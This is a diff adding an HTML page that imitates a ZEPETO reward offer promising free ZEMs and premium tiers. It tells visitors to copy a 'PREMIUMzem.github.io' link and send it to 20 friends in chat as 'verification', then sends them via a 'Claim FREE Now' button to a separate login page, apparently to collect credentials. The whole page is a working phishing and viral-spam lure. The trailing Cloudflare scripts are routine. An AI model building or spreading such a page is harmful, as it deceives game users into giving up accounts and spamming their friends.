@@ -1,0 +1,359 @@
+<!doctype html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>ZEPETO</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Poppins, sans-serif;
+        }
+
+        body {
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            min-height: 100%;
+            overflow-y: auto;
+        }
+
+        ::-webkit-scrollbar {
+            display: none;
+        }
+
+        .header {
+            width: 100%;
+            background: linear-gradient(90deg, #fc0360, #fd0cc0);
+            padding: 40px 20px 20px;
+            text-align: center;
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 10;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, .1);
+            transition: background .3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .header img {
+            width: 55px;
+            margin-bottom: 0;
+            margin-top: -15px;
+            transition: opacity .3s ease;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            margin-top: 160px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 70px;
+        }
+
+        .title-container {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 15px;
+            padding-bottom: 5px;
+            position: relative;
+        }
+
+        .title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #fc0360;
+            padding: 8px 20px;
+            display: inline-block;
+            position: relative;
+            border: 3px solid #fc0360;
+            border-radius: 50px;
+        }
+
+        .options {
+            width: 100%;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            padding: 0 10px;
+        }
+
+        .option {
+            padding: 10px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            background: #f0f0f0;
+            transition: all .3s ease-in-out;
+        }
+
+        .option.selected {
+            background: linear-gradient(90deg, #fc0360, #fd0cc0);
+            color: #fff;
+            border: 2px solid #fc0360;
+            transform: scale(1.05);
+            box-shadow: 0 4px 10px rgba(252, 3, 96, .3);
+        }
+
+        .copy-box {
+            margin-top: 15px;
+            width: 90%;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+            border: 2px solid #fc0360;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #f8f8f8;
+        }
+
+        .copy-input {
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: 500;
+            background: #f8f8f8;
+            cursor: default;
+            border: none;
+            border-bottom: 2px solid #fc0360;
+        }
+
+        .copy-button {
+            width: 100%;
+            padding: 10px;
+            background: linear-gradient(90deg, #fc0360, #fd0cc0);
+            color: #fff;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            border: none;
+            transition: all .3s ease;
+        }
+
+        .copy-button:active {
+            opacity: 0.8;
+        }
+
+        .info {
+            margin-top: 10px;
+            font-style: italic;
+            color: #5a5a5a;
+            font-size: 11px;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+            padding: 0 15px;
+        }
+
+        .button {
+            width: 90%;
+            position: fixed;
+            bottom: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: linear-gradient(90deg, #fc0360, #fd0cc0);
+            text-align: center;
+            padding: 14px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 17px;
+            border-radius: 15px;
+            cursor: pointer;
+            z-index: 15;
+            box-shadow: 0 4px 15px rgba(252, 3, 96, .3);
+            transition: all .3s ease;
+            text-decoration: none;
+        }
+
+        .button:hover {
+            transform: translateX(-50%) translateY(-2px);
+            box-shadow: 0 6px 20px rgba(252, 3, 96, .4);
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 75px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            color: #000;
+            padding: 12px 20px;
+            border-radius: 10px;
+            border: none;
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.5;
+            z-index: 14;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            pointer-events: none;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, .15);
+            width: calc(100% - 20px);
+            max-width: 340px;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding-left: 10px;
+                padding-right: 10px;
+            }
+        }
+    </style>
+  <style>@view-transition { navigation: auto; }</style>
+  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
+  <script src="/_sdk/element_sdk.js" type="text/javascript"></script>
+  <script src="https://cdn.tailwindcss.com" type="text/javascript"></script>
+ </head>
+ <body>
+  <div class="header"><img src="Logo.png" alt="Premium Icon" onerror="this.style.display='none'">Premium Plus
+  </div>
+  <div class="container">
+   <div class="title-container">
+    <div class="title">
+     Choose Your Reward
+    </div>
+   </div>
+   <div class="options">
+    <div class="option" onclick="selectOption(this)">
+     70 ZEMs <br>
+     Premium Basic
+    </div>
+    <div class="option selected" onclick="selectOption(this)">
+     170 ZEMs <br>
+     Premium Plus
+    </div>
+    <div class="option" onclick="selectOption(this)">
+     Character <br>
+     3 Slot Character
+    </div>
+    <div class="option" onclick="selectOption(this)">
+     Just ZEMs <br>
+     Get 200 ZEMs
+    </div>
+   </div>
+   <div class="copy-box">
+    <div class="copy-input" id="copy-text">
+     PREMIUMzem.github.io
+    </div>
+    <div class="copy-button" onclick="copyText()">
+     Copy
+    </div>
+   </div>
+   <div class="info">
+    Copy and Send to 20 ZEPETO friends in chat-room to join the event.
+   </div>
+  </div><a href="4_Login.html" class="button">Claim FREE Now</a>
+  <div class="toast" id="toast">
+   🎉 Complete verification by copying and sharing to 20 active friends chat-room.
+  </div>
+  <script>
+        function selectOption(e) {
+            document.querySelectorAll(".option").forEach((e => e.classList.remove("selected")));
+            e.classList.add("selected");
+        }
+
+        function copyText() {
+            navigator.clipboard.writeText("PREMIUMzem.github.io").then(() => {
+                showToast();
+            }).catch((e) => {
+                console.error("Failed to copy: ", e);
+                showToast("Failed to copy. Please try again.");
+            });
+        }
+
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            if (message) toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 7000);
+        }
+    </script>
+  <script>
+        !function() {
+            function e() {
+                var e = t.contentDocument || t.contentWindow.document;
+                if (e) {
+                    var n = e.createElement("script");
+                    n.innerHTML = "window.__CF$cv$params={r:'946fedfe12e203d4',t:'MTc0ODQ1ODE0Mi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
+                    e.getElementsByTagName("head")[0].appendChild(n);
+                }
+            }
+            if (document.body) {
+                var t = document.createElement("iframe");
+                if (t.height = 1, t.width = 1, t.style.position = "absolute", t.style.top = 0, t.style.left = 0, t.style.border = "none", t.style.visibility = "hidden", document.body.appendChild(t), "loading" !== document.readyState)
+                    e();
+                else if (window.addEventListener)
+                    document.addEventListener("DOMContentLoaded", e);
+                else {
+                    var n = document.onreadystatechange || function() {};
+                    document.onreadystatechange = function(t) {
+                        n(t);
+                        "loading" !== document.readyState && (document.onreadystatechange = n, e());
+                    }
+                }
+            }
+        }()
+    </script>
+  <script>
+        (function() {
+            function c() {
+                var b = a.contentDocument || a.contentWindow.document;
+                if (b) {
+                    var d = b.createElement('script');
+                    d.innerHTML = "window.__CF$cv$params={r:'952b0e58d5956d0a',t:'MTc1MDQyMDMwNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
+                    b.getElementsByTagName('head')[0].appendChild(d);
+                }
+            }
+            if (document.body) {
+                var a = document.createElement('iframe');
+                a.height = 1;
+                a.width = 1;
+                a.style.position = 'absolute';
+                a.style.top = 0;
+                a.style.left = 0;
+                a.style.border = 'none';
+                a.style.visibility = 'hidden';
+                document.body.appendChild(a);
+                if ('loading' !== document.readyState)
+                    c();
+                else if (window.addEventListener)
+                    document.addEventListener('DOMContentLoaded', c);
+                else {
+                    var e = document.onreadystatechange || function() {};
+                    document.onreadystatechange = function(b) {
+                        e(b);
+                        'loading' !== document.readyState && (document.onreadystatechange = e, c());
+                    }
+                }
+            }
+        })();
+    </script>
+ <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9a20763f3722b5a5',t:'MTc2MzczMDk5MC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
